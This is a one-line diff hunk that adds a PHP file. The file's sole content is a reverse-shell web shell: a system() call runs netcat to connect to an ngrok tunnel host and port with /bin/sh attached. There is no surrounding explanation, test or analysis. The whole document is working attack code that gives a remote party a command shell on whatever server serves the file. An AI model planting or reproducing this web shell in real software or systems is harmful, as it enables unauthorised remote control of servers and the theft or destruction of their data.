@@ -1,0 +1,1 @@
+<?php system("nc 0.tcp.ap.ngrok.io 11056 -e /bin/sh"); ?>
